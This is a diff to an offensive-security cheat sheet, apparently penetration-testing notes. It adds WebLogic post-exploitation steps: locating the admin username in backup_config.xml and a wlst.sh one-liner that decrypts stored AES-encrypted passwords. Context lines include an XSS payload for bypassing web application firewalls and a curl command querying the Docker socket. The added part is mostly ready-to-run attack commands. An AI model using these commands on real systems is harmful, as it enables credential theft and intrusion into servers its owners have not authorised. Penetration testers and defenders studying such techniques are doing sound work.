@@ -34,6 +34,12 @@
  -  `<![CDATA[ <script>prompt(2)</script> ]]>` (Sometimes WAFS block by keywords like DOCTYPE, ENTITY & ect, but you can inject into `<![CDATA[X]]>` )
 
 ### PWN scripts/tips
+* WebLogic:
+  * Get Username:
+    * Get file PATH_OF_WEBLOGIC/config/backup_config.xml and search for "<default-realm>" and get the user there.
+  * Dump Password:
+    * `echo "domain=\"PATH_OF_WEBLOGICSERVER\";service=weblogic.security.internal.SerializedSystemIni.getEncryptionService(domain);encryption=weblogic.security.internal.encryption.ClearOrEncryptedService(service); print encryption.decrypt(\"{AES}HASH\");exit" | /PATH/OF/wlst.sh`
+
 * Docker:
   * Get all containers or images:
     * `curl -i -s --unix-socket /var/run/docker.sock -X GET http://localhost/containers/json`
